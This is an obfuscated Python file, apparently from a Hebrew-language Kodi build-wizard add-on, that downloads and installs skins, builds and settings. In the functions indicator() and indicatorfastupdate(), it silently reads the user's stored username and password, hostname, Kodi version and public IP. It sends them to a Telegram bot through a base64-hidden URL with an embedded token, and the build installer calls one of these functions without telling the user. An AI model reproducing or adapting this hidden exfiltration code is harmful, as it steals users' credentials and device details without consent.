def googledrive_download (O0OO00OOO00OOO00O ,O00OOO00OO0000OOO ,O0O0O0O0OO000OO00 ,O0OO000O00OO0O00O ):#line:3375
    OO000OOO0OOOO0OOO =[]#line:3379
    O0OOOOOOOO0O000OO =O0OO00OOO00OOO00O .split ('=')#line:3380
    O0OO00OOO00OOO00O =O0OOOOOOOO0O000OO [len (O0OOOOOOOO0O000OO )-1 ]#line:3381
    def OOOO0O00000OO0000 (OOO0OOO00000OOO00 ):#line:3383
        for O0O00OOOO0OOO0000 in OOO0OOO00000OOO00 :#line:3385
            logging .warning ('cookie.name')#line:3386
            logging .warning (O0O00OOOO0OOO0000 .name )#line:3387
            OOO0OO00OO00OOOOO =O0O00OOOO0OOO0000 .value #line:3388
            if 'download_warning'in O0O00OOOO0OOO0000 .name :#line:3389
                logging .warning (O0O00OOOO0OOO0000 .value )#line:3390
                logging .warning ('cookie.value')#line:3391
                return O0O00OOOO0OOO0000 .value #line:3392
            return OOO0OO00OO00OOOOO #line:3393
        return None #line:3395
    def O0OOO0O00O00O00O0 (OO000OOOO00OO00OO ,O00000OOO0OOO000O ):#line:3397
        O00000000OOOOOOO0 =32768 #line:3399
        OO0OOO000OOO0OO0O =time .time ()#line:3400
        with open (O00000OOO0OOO000O ,"wb")as O0OOO0000O0OO0OOO :#line:3402
            O0000000O00OOO000 =1 #line:3403
            O0OO0O0O0O0OO0OO0 =32768 #line:3404
            try :#line:3405
                O00O0OO0000O00OO0 =int (OO000OOOO00OO00OO .headers .get ('content-length'))#line:3406
                print ('file total size :',O00O0OO0000O00OO0 )#line:3407
            except TypeError :#line:3408
                print ('using dummy length !!!')#line:3409
                O00O0OO0000O00OO0 =int (O0OO000O00OO0O00O )*1000000 #line:3410
            for O0O0OOO0O0O0000O0 in OO000OOOO00OO00OO .iter_content (O00000000OOOOOOO0 ):#line:3411
                if O0O0OOO0O0O0000O0 :#line:3412
                    O0OOO0000O0OO0OOO .write (O0O0OOO0O0O0000O0 )#line:3413
                    O0OOO0000O0OO0OOO .flush ()#line:3414
                    O0OOO000O00OOO00O =time .time ()-OO0OOO000OOO0OO0O #line:3415
                    O000OO0O0OO00000O =int (O0000000O00OOO000 *O0OO0O0O0O0OO0OO0 )#line:3416
                    if O0OOO000O00OOO00O ==0 :#line:3417
                        O0OOO000O00OOO00O =0.1 #line:3418
                    OO0O0OO0O0O00O00O =int (O000OO0O0OO00000O /(1024 *O0OOO000O00OOO00O ))#line:3419
                    O0OO000000OOOOOOO =int (O0000000O00OOO000 *O0OO0O0O0O0OO0OO0 *100 /O00O0OO0000O00OO0 )#line:3420
                    if OO0O0OO0O0O00O00O >1024 and not O0OO000000OOOOOOO ==100 :#line:3421
                      OOOOOO0OO000OO00O =int (((O00O0OO0000O00OO0 -O000OO0O0OO00000O )/1024 )/(OO0O0OO0O0O00O00O ))#line:3422
                    else :#line:3423
                      OOOOOO0OO000OO00O =0 #line:3424
                    O0O0O0O0OO000OO00 .update (int (O0OO000000OOOOOOO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO000000OOOOOOO ,O000OO0O0OO00000O /(1024 *1024 ),O00O0OO0000O00OO0 /(1000 *1000 ),OO0O0OO0O0O00O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOOO0OO000OO00O ,60 ))#line:3426
                    O0000000O00OOO000 +=1 #line:3427
                    if O0O0O0O0OO000OO00 .iscanceled ():#line:3428
                     O0O0O0O0OO000OO00 .close ()#line:3429
                     break #line:3430
    OOOO0O0OOOO000OO0 ="https://docs.google.com/uc?export=download"#line:3431
    import urllib2 #line:3436
    import cookielib #line:3437
    from cookielib import CookieJar #line:3439
    O00O0OOO000O00OO0 =CookieJar ()#line:3441
    O000O0O0OO00OOO00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O00O0OOO000O00OO0 ))#line:3442
    OOO00O0O000OO00OO ={'id':O0OO00OOO00OOO00O }#line:3444
    OO00O0OO00O0000OO =urllib .urlencode (OOO00O0O000OO00OO )#line:3445
    logging .warning (OOOO0O0OOOO000OO0 +'&'+OO00O0OO00O0000OO )#line:3446
    O0OOO0OO00000OO0O =O000O0O0OO00OOO00 .open (OOOO0O0OOOO000OO0 +'&'+OO00O0OO00O0000OO )#line:3447
    O00O0OO00O0OO00OO =O0OOO0OO00000OO0O .read ()#line:3448
    for O00O0OOOO0O00O0O0 in O00O0OOO000O00OO0 :#line:3450
         logging .warning (O00O0OOOO0O00O0O0 )#line:3451
    OO0O0O0O00OO00OO0 =OOOO0O00000OO0000 (O00O0OOO000O00OO0 )#line:3452
    logging .warning (OO0O0O0O00OO00OO0 )#line:3453
    if OO0O0O0O00OO00OO0 :#line:3454
        O0OOO00OO000000O0 ={'id':O0OO00OOO00OOO00O ,'confirm':OO0O0O0O00OO00OO0 }#line:3455
        OOOOO0O000OO0O0OO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3456
        OO00O0OO00O0000OO =urllib .urlencode (O0OOO00OO000000O0 )#line:3457
        O0OOO0OO00000OO0O =O000O0O0OO00OOO00 .open (OOOO0O0OOOO000OO0 +'&'+OO00O0OO00O0000OO )#line:3458
        chunk_read (O0OOO0OO00000OO0O ,report_hook =chunk_report ,dp =O0O0O0O0OO000OO00 ,destination =O00OOO00OO0000OOO ,filesize =O0OO000O00OO0O00O )#line:3459
    return (OO000OOO0OOOO0OOO )#line:3463
def kodi17Fix ():#line:3464
	O0OO00000O0OOO00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3465
	O0O0O0OO0000OO00O =[]#line:3466
	for O0O00O0OOOO00OOOO in sorted (O0OO00000O0OOO00O ,key =lambda O0000O0O00O000OO0 :O0000O0O00O000OO0 ):#line:3467
		OOOOO00OO000OOO00 =os .path .join (O0O00O0OOOO00OOOO ,'addon.xml')#line:3468
		if os .path .exists (OOOOO00OO000OOO00 ):#line:3469
			OOOOO000OO0OOO00O =O0O00O0OOOO00OOOO .replace (ADDONS ,'')[1 :-1 ]#line:3470
			OO00OO00OOOO0O0OO =open (OOOOO00OO000OOO00 )#line:3471
			OOO00000O00O0O00O =OO00OO00OOOO0O0OO .read ()#line:3472
			O0OOOOO0OOOO0000O =parseDOM (OOO00000O00O0O00O ,'addon',ret ='id')#line:3473
			OO00OO00OOOO0O0OO .close ()#line:3474
			try :#line:3475
				O0000O0O0O0O0000O =xbmcaddon .Addon (id =O0OOOOO0OOOO0000O [0 ])#line:3476
			except :#line:3477
				try :#line:3478
					log ("%s was disabled"%O0OOOOO0OOOO0000O [0 ],xbmc .LOGDEBUG )#line:3479
					O0O0O0OO0000OO00O .append (O0OOOOO0OOOO0000O [0 ])#line:3480
				except :#line:3481
					try :#line:3482
						log ("%s was disabled"%OOOOO000OO0OOO00O ,xbmc .LOGDEBUG )#line:3483
						O0O0O0OO0000OO00O .append (OOOOO000OO0OOO00O )#line:3484
					except :#line:3485
						if len (O0OOOOO0OOOO0000O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOOOO000OO0OOO00O ,xbmc .LOGERROR )#line:3486
						else :log ("Unabled to enable: %s"%O0O00O0OOOO00OOOO ,xbmc .LOGERROR )#line:3487
	if len (O0O0O0OO0000OO00O )>0 :#line:3488
		OO0O00OO0OO0OO000 =0 #line:3489
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3490
		for O00O0000O0000OOOO in O0O0O0OO0000OO00O :#line:3491
			OO0O00OO0OO0OO000 +=1 #line:3492
			O0O000OO00OO00000 =int (percentage (OO0O00OO0OO0OO000 ,len (O0O0O0OO0000OO00O )))#line:3493
			DP .update (O0O000OO00OO00000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0000O0000OOOO ))#line:3494
			addonDatabase (O00O0000O0000OOOO ,1 )#line:3495
			if DP .iscanceled ():break #line:3496
		if DP .iscanceled ():#line:3497
			DP .close ()#line:3498
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3499
			sys .exit ()#line:3500
		DP .close ()#line:3501
	forceUpdate ()#line:3502
def indicator ():#line:3504
       try :#line:3505
          import json #line:3506
          wiz .log ('FRESH MESSAGE')#line:3507
          OO0OO00OO00OO00O0 =(ADDON .getSetting ("user"))#line:3508
          O00O000O0OO0O0OOO =(ADDON .getSetting ("pass"))#line:3509
          O00O0000O0O00OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3510
          O0000OO00OO000OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3511
          OOOO0O0O0O00000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3512
          OOOO0OOOO0OOOO0O0 =str (json .loads (OOOO0O0O0O00000O0 )['ip'])#line:3513
          OO000O0OOOOOOO00O =OO0OO00OO00OO00O0 #line:3514
          O00O0OOO0000O0O00 =O00O000O0OO0O0OOO #line:3515
          import socket #line:3516
          OOOO0O0O0O00000O0 =urllib2 .urlopen (O0000OO00OO000OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO000O0OOOOOOO00O +' - '+O00O0OOO0000O0O00 +' - '+O00O0000O0O00OO00 +' - '+OOOO0OOOO0OOOO0O0 ).readlines ()#line:3517
       except :pass #line:3519
def indicatorfastupdate ():#line:3521
       try :#line:3522
          import json #line:3523
          wiz .log ('FRESH MESSAGE')#line:3524
          O0O0OOOO00000O00O =(ADDON .getSetting ("user"))#line:3525
          OOOO00OOO0O0O0OO0 =(ADDON .getSetting ("pass"))#line:3526
          OO000O0OO0OOOOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3527
          OO000OOOOOO0O0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3529
          OOOOO000OO00OOO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3530
          O0O0OO0O0O00O0OO0 =str (json .loads (OOOOO000OO00OOO00 )['ip'])#line:3531
          O0O000OO0000000OO =O0O0OOOO00000O00O #line:3532
          O000O000000OO00O0 =OOOO00OOO0O0O0OO0 #line:3533
          import socket #line:3535
          OOOOO000OO00OOO00 =urllib2 .urlopen (OO000OOOOOO0O0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O000OO0000000OO +' - '+O000O000000OO00O0 +' - '+OO000O0OO0OOOOO0O +' - '+O0O0OO0O0O00O0OO0 ).readlines ()#line:3536
       except :pass #line:3538
def skinfix18 ():#line:3540
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3541
		O000O00O0OO0OOO0O =wiz .workingURL (SKINID18DDONXML )#line:3542
		if O000O00O0OO0OOO0O ==True :#line:3543
			OO000O0O0000OOOO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3544
			if len (OO000O0O0000OOOO0 )>0 :#line:3545
				O00OO0O000OO00000 ='%s-%s.zip'%(SKINID18 ,OO000O0O0000OOOO0 [0 ])#line:3546
				OO0O00OOO0O000OO0 =wiz .workingURL (SKIN18ZIPURL +O00OO0O000OO00000 )#line:3547
				if OO0O00OOO0O000OO0 ==True :#line:3548
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3549
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3550
					O0O0OO0O0OOOO000O =os .path .join (PACKAGES ,O00OO0O000OO00000 )#line:3551
					try :os .remove (O0O0OO0O0OOOO000O )#line:3552
					except :pass #line:3553
					downloader .download (SKIN18ZIPURL +O00OO0O000OO00000 ,O0O0OO0O0OOOO000O ,DP )#line:3554
					extract .all (O0O0OO0O0OOOO000O ,HOME ,DP )#line:3555
					try :#line:3556
						O000OO0O0O000OO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3557
						OO0O0OOOO0OOO0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3558
						os .rename (O000OO0O0O000OO00 ,OO0O0OOOO0OOO0000 )#line:3559
					except :#line:3560
						pass #line:3561
					try :#line:3562
						OO0OO0OOOO0OOO000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0OOO00O0O0O000OO =OO0OO0OOOO0OOO000 .read ();OO0OO0OOOO0OOO000 .close ()#line:3563
						O0OO00O00OOO000OO =wiz .parseDOM (O0OOO00O0O0O000OO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3564
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO00O00OOO000OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3565
					except :#line:3566
						pass #line:3567
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3568
					DP .close ()#line:3569
					xbmc .sleep (500 )#line:3570
					wiz .forceUpdate (True )#line:3571
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3572
				else :#line:3573
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3574
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0O00OOO0O000OO0 ,xbmc .LOGERROR )#line:3575
			else :#line:3576
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3577
		else :#line:3578
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3579
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3580
def skinfix17 ():#line:3581
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3582
		O0O0OOO0O000O0OO0 =wiz .workingURL (SKINID17DDONXML )#line:3583
		if O0O0OOO0O000O0OO0 ==True :#line:3584
			OO0O00O0OOO0O0O0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3585
			if len (OO0O00O0OOO0O0O0O )>0 :#line:3586
				O000000000OOOOO00 ='%s-%s.zip'%(SKINID17 ,OO0O00O0OOO0O0O0O [0 ])#line:3587
				O0OO0000O0O000O00 =wiz .workingURL (SKIN17ZIPURL +O000000000OOOOO00 )#line:3588
				if O0OO0000O0O000O00 ==True :#line:3589
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3590
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3591
					O0OO000000OOOOOO0 =os .path .join (PACKAGES ,O000000000OOOOO00 )#line:3592
					try :os .remove (O0OO000000OOOOOO0 )#line:3593
					except :pass #line:3594
					downloader .download (SKIN17ZIPURL +O000000000OOOOO00 ,O0OO000000OOOOOO0 ,DP )#line:3595
					extract .all (O0OO000000OOOOOO0 ,HOME ,DP )#line:3596
					try :#line:3597
						OOO0O0O00O0OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3598
						OOO0O00000OO0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3599
						os .rename (OOO0O0O00O0OO0OO0 ,OOO0O00000OO0OOO0 )#line:3600
					except :#line:3601
						pass #line:3602
					try :#line:3603
						O0000O00OO0OO0OO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00O0O00OO0OOOO00 =O0000O00OO0OO0OO0 .read ();O0000O00OO0OO0OO0 .close ()#line:3604
						O00OO00OOOOOOOO00 =wiz .parseDOM (O00O0O00OO0OOOO00 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3605
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00OOOOOOOO00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3606
					except :#line:3607
						pass #line:3608
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3609
					DP .close ()#line:3610
					xbmc .sleep (500 )#line:3611
					wiz .forceUpdate (True )#line:3612
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3613
				else :#line:3614
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3615
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO0000O0O000O00 ,xbmc .LOGERROR )#line:3616
			else :#line:3617
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3618
		else :#line:3619
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3620
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3621
def fix17update ():#line:3622
	if KODIV >=17 and KODIV <18 :#line:3623
		wiz .kodi17Fix ()#line:3624
		xbmc .sleep (4000 )#line:3625
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3626
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3627
		fixfont ()#line:3628
		OOO0O0O0OOOO0OOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3629
		try :#line:3631
			OOOOO0000O0000OO0 =open (OOO0O0O0OOOO0OOOO ,'r')#line:3632
			O00000OO00OOOOOOO =OOOOO0000O0000OO0 .read ()#line:3633
			OOOOO0000O0000OO0 .close ()#line:3634
			OOO00OOOOOOO00000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3635
			O0O00OO0OOO000O00 =re .compile (OOO00OOOOOOO00000 ).findall (O00000OO00OOOOOOO )[0 ]#line:3636
			OOOOO0000O0000OO0 =open (OOO0O0O0OOOO0OOOO ,'w')#line:3637
			OOOOO0000O0000OO0 .write (O00000OO00OOOOOOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0O00OO0OOO000O00 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3638
			OOOOO0000O0000OO0 .close ()#line:3639
		except :#line:3640
				pass #line:3641
		wiz .kodi17Fix ()#line:3642
		OOO0O0O0OOOO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3643
		try :#line:3644
			OOOOO0000O0000OO0 =open (OOO0O0O0OOOO0OOOO ,'r')#line:3645
			O00000OO00OOOOOOO =OOOOO0000O0000OO0 .read ()#line:3646
			OOOOO0000O0000OO0 .close ()#line:3647
			OOO00OOOOOOO00000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3648
			O0O00OO0OOO000O00 =re .compile (OOO00OOOOOOO00000 ).findall (O00000OO00OOOOOOO )[0 ]#line:3649
			OOOOO0000O0000OO0 =open (OOO0O0O0OOOO0OOOO ,'w')#line:3650
			OOOOO0000O0000OO0 .write (O00000OO00OOOOOOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0O00OO0OOO000O00 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3651
			OOOOO0000O0000OO0 .close ()#line:3652
		except :#line:3653
				pass #line:3654
		swapSkins ('skin.Premium.mod')#line:3655
def fix18update ():#line:3657
	if KODIV >=18 :#line:3658
		xbmc .sleep (4000 )#line:3659
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3660
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3661
		fixfont ()#line:3662
		O000OOOOO0000OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3663
		try :#line:3664
			OO000O00OO00OOO0O =open (O000OOOOO0000OO0O ,'r')#line:3665
			O0O000O00O0O0O00O =OO000O00OO00OOO0O .read ()#line:3666
			OO000O00OO00OOO0O .close ()#line:3667
			O0O00000OO0000O0O ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3668
			OOOO0OOO00000O000 =re .compile (O0O00000OO0000O0O ).findall (O0O000O00O0O0O00O )[0 ]#line:3669
			OO000O00OO00OOO0O =open (O000OOOOO0000OO0O ,'w')#line:3670
			OO000O00OO00OOO0O .write (O0O000O00O0O0O00O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOO0OOO00000O000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3671
			OO000O00OO00OOO0O .close ()#line:3672
		except :#line:3673
				pass #line:3674
		wiz .kodi17Fix ()#line:3675
		O000OOOOO0000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3676
		try :#line:3677
			OO000O00OO00OOO0O =open (O000OOOOO0000OO0O ,'r')#line:3678
			O0O000O00O0O0O00O =OO000O00OO00OOO0O .read ()#line:3679
			OO000O00OO00OOO0O .close ()#line:3680
			O0O00000OO0000O0O ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3681
			OOOO0OOO00000O000 =re .compile (O0O00000OO0000O0O ).findall (O0O000O00O0O0O00O )[0 ]#line:3682
			OO000O00OO00OOO0O =open (O000OOOOO0000OO0O ,'w')#line:3683
			OO000O00OO00OOO0O .write (O0O000O00O0O0O00O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOO0OOO00000O000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3684
			OO000O00OO00OOO0O .close ()#line:3685
		except :#line:3686
				pass #line:3687
		swapSkins ('skin.Premium.mod')#line:3688
def buildWizard (OOO0OO000O000O0OO ,O000OO0O0O00O0O0O ,theme =None ,over =False ):#line:3691
	if over ==False :#line:3692
		O0O000O00O00OOOO0 =wiz .checkBuild (OOO0OO000O000O0OO ,'url')#line:3693
		if O0O000O00O00OOOO0 ==False :#line:3695
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3700
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3701
			return #line:3702
		OOOOO0OO0OO0OOOO0 =wiz .workingURL (O0O000O00O00OOOO0 )#line:3703
		if OOOOO0OO0OO0OOOO0 ==False :#line:3704
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OOOOO0OO0OO0OOOO0 ))#line:3705
			return #line:3706
	if O000OO0O0O00O0O0O =='gui':#line:3707
		if OOO0OO000O000O0OO ==BUILDNAME :#line:3708
			if over ==True :OO0OO00OOO0000OOO =1 #line:3709
			else :OO0OO00OOO0000OOO =1 #line:3710
		else :#line:3711
			OO0OO00OOO0000OOO =1 #line:3712
		if OO0OO00OOO0000OOO :#line:3713
			remove_addons ()#line:3714
			remove_addons2 ()#line:3715
			O0OOO00OOOOOO0000 =wiz .checkBuild (OOO0OO000O000O0OO ,'gui')#line:3716
			OO000OOOOO000OO00 =OOO0OO000O000O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3717
			if not wiz .workingURL (O0OOO00OOOOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3718
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3719
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO ),'','אנא המתן')#line:3720
			OOO000OO000000O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO000OOOOO000OO00 )#line:3721
			try :os .remove (OOO000OO000000O00 )#line:3722
			except :pass #line:3723
			logging .warning (O0OOO00OOOOOO0000 )#line:3724
			if 'google'in O0OOO00OOOOOO0000 :#line:3725
			   OO00000000O0O0OOO =googledrive_download (O0OOO00OOOOOO0000 ,OOO000OO000000O00 ,DP ,wiz .checkBuild (OOO0OO000O000O0OO ,'filesize'))#line:3726
			else :#line:3729
			  downloader .download (O0OOO00OOOOOO0000 ,OOO000OO000000O00 ,DP )#line:3730
			xbmc .sleep (100 )#line:3731
			OOOOO0OO000OO0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO )#line:3732
			DP .update (0 ,OOOOO0OO000OO0O00 ,'','אנא המתן')#line:3733
			extract .all (OOO000OO000000O00 ,HOME ,DP ,title =OOOOO0OO000OO0O00 )#line:3734
			DP .close ()#line:3735
			wiz .defaultSkin ()#line:3736
			wiz .lookandFeelData ('save')#line:3737
			wiz .kodi17Fix ()#line:3738
			if KODIV >=18 :#line:3739
				skindialogsettind18 ()#line:3740
			xbmc .executebuiltin ("ReloadSkin()")#line:3741
			if INSTALLMETHOD ==1 :OO0OO00OO0O0OOOOO =1 #line:3742
			elif INSTALLMETHOD ==2 :OO0OO00OO0O0OOOOO =0 #line:3743
			else :DP .close ()#line:3744
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3745
			indicatorfastupdate ()#line:3746
		else :#line:3748
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3749
	if O000OO0O0O00O0O0O =='gui2':#line:3750
		if OOO0OO000O000O0OO ==BUILDNAME :#line:3751
			if over ==True :OO0OO00OOO0000OOO =1 #line:3752
			else :OO0OO00OOO0000OOO =1 #line:3753
		else :#line:3754
			OO0OO00OOO0000OOO =1 #line:3755
		if OO0OO00OOO0000OOO :#line:3756
			remove_addons ()#line:3757
			remove_addons2 ()#line:3758
			O0OOO00OOOOOO0000 =wiz .checkBuild (OOO0OO000O000O0OO ,'gui')#line:3759
			OO000OOOOO000OO00 =OOO0OO000O000O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3760
			if not wiz .workingURL (O0OOO00OOOOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3761
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3762
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO ),'','אנא המתן')#line:3763
			OOO000OO000000O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO000OOOOO000OO00 )#line:3764
			try :os .remove (OOO000OO000000O00 )#line:3765
			except :pass #line:3766
			logging .warning (O0OOO00OOOOOO0000 )#line:3767
			if 'google'in O0OOO00OOOOOO0000 :#line:3768
			   OO00000000O0O0OOO =googledrive_download (O0OOO00OOOOOO0000 ,OOO000OO000000O00 ,DP ,wiz .checkBuild (OOO0OO000O000O0OO ,'filesize'))#line:3769
			else :#line:3772
			  downloader .download (O0OOO00OOOOOO0000 ,OOO000OO000000O00 ,DP )#line:3773
			xbmc .sleep (100 )#line:3774
			OOOOO0OO000OO0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO000O000O0OO )#line:3775
			DP .update (0 ,OOOOO0OO000OO0O00 ,'','אנא המתן')#line:3776
			extract .all (OOO000OO000000O00 ,HOME ,DP ,title =OOOOO0OO000OO0O00 )#line:3777
			DP .close ()#line:3778
			wiz .defaultSkin ()#line:3779
			wiz .lookandFeelData ('save')#line:3780
			if INSTALLMETHOD ==1 :OO0OO00OO0O0OOOOO =1 #line:3783
